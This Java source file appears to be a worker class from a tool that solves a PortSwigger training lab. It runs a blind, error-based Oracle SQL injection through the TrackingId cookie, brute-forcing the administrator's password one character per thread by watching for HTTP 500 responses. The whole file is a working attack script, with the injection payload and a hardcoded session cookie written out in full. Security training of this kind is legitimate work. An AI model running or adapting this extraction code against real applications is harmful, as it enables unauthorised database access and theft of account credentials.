package br.com.sqli.portswagger;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.http.HttpResponse.BodyHandlers;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.atomic.AtomicReferenceArray;

public class ConsumerTask implements Runnable {

	private AtomicReferenceArray<String> passwordQueue;
	private int position;
	private String url;

	public ConsumerTask(AtomicReferenceArray<String> passwordQueue, int position, String url) {
		this.passwordQueue = passwordQueue;
		this.position = position;
		this.url = url;

	}

	@Override
	public void run() {
		String letter = null;
		HttpClient httpClient = HttpClient.newBuilder().build();
		try {

			for (int i = 32; i < 126; i++) {

				String payload = encodeValue(
						"aQbyIVejQ2QkoBot' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator' and ascii(substr(password,"
								+ this.position + ",1)) =" + i + ") || '");

				HttpRequest request = HttpRequest.newBuilder().uri(URI.create(url))
						.header("Cookie", "session=9miO3JWOCvC0iLWw0hmzRUVwuacvf4ZW; TrackingId=" + payload).build();
				HttpResponse<String> response = httpClient.send(request, BodyHandlers.ofString());
				
				if (response.statusCode() == 500) {
					letter = String.valueOf((char) i);
					break;
				}
			}

			this.passwordQueue.set(this.position - 1, letter);
		} catch (IOException | InterruptedException e) {
			e.printStackTrace();
		}

	}

	private String encodeValue(String value) throws UnsupportedEncodingException {
		return URLEncoder.encode(value, StandardCharsets.UTF_8.toString());
	}

}
